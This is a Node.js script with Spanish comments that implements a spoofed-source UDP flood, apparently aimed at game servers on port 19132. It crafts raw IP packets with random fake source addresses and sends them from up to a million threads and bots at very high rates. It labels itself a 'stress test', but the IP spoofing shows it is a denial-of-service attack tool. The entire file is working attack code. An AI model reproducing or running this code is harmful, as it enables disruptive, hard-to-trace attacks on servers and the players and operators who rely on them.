const { Worker, isMainThread, workerData } = require('worker_threads');
const raw = require('raw-socket');
const { randomBytes } = require('crypto');

if (isMainThread) {
    const args = process.argv.slice(2);
    const serverAddress = args[0] || '127.0.0.1'; // IP del servidor
    const serverPort = parseInt(args[1], 10) || 19132; // Puerto del servidor
    const numBots = parseInt(args[2], 10) || 1000000; // Número de bots
    const pps = parseInt(args[3], 10) || 1000000; // Paquetes por segundo por bot
    const duration = parseInt(args[4], 10) || 1000000; // Duración en segundos (hasta 1M de segundos)
    const numThreads = parseInt(args[5], 10) || 1000000; // Número de hilos (hasta 1M de hilos)

    for (let i = 0; i < numThreads; i++) {
        new Worker(__filename, { workerData: { serverAddress, serverPort, numBots, pps, duration } });
    }
} else {
    const { serverAddress, serverPort, numBots, pps, duration } = workerData;
    const udpClient = raw.createSocket({ protocol: raw.Protocol.UDP });

    function getRandomIp() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    function createUdpPacket(sourceIp, destIp, destPort, data) {
        const packet = Buffer.alloc(28 + data.length);
        packet.writeUInt8(0x45, 0); // Version and header length
        packet.writeUInt16BE(packet.length, 2); // Total length
        packet.writeUInt16BE(0, 4); // Identification
        packet.writeUInt16BE(0x4000, 6); // Flags and fragment offset
        packet.writeUInt8(64, 8); // TTL
        packet.writeUInt8(17, 9); // Protocol (UDP)
        packet.writeUInt16BE(0, 10); // Header checksum (initially 0)
        packet.writeUInt32BE(ipToInt(sourceIp), 12); // Source IP
        packet.writeUInt32BE(ipToInt(destIp), 16); // Destination IP

        // UDP header
        packet.writeUInt16BE(12345, 20); // Source port
        packet.writeUInt16BE(destPort, 22); // Destination port
        packet.writeUInt16BE(8 + data.length, 24); // Length
        packet.writeUInt16BE(0, 26); // Checksum (optional)

        // Data
        data.copy(packet, 28);

        // Calculate IP header checksum
        let checksum = 0;
        for (let i = 0; i < 20; i += 2) {
            checksum += packet.readUInt16BE(i);
        }
        checksum = (checksum >> 16) + (checksum & 0xffff);
        checksum += (checksum >> 16);
        packet.writeUInt16BE(~checksum & 0xffff, 10);

        return packet;
    }

    function ipToInt(ip) {
        return ip.split('.').reduce((int, octet) => (int << 8) + parseInt(octet, 10), 0);
    }

    function sendUdpPacket(botId, packetId) {
        const sourceIp = getRandomIp();
        const message = Buffer.from(`Bot ${botId} - Paquete UDP ${packetId} desde ${sourceIp}`);
        const packet = createUdpPacket(sourceIp, serverAddress, serverPort, message);
        udpClient.send(packet, 0, packet.length, serverPort, serverAddress, (err) => {
            if (err) {
                console.error(`Bot ${botId}: Error al enviar paquete UDP ${packetId} - ${err.message}`);
            } else {
                console.log(`Bot ${botId}: Enviando paquete UDP ${packetId} desde ${sourceIp} a ${serverAddress}:${serverPort}`);
            }
        });
    }

    for (let botId = 0; botId < numBots; botId++) {
        let packetId = 0;
        const interval = setInterval(() => {
            sendUdpPacket(botId, packetId);
            packetId++;
        }, 1000 / pps);

        setTimeout(() => {
            clearInterval(interval);
            if (botId === numBots - 1) {
                udpClient.close();
                console.log("Prueba de estrés completada.");
            }
        }, duration * 1000);
    }
}
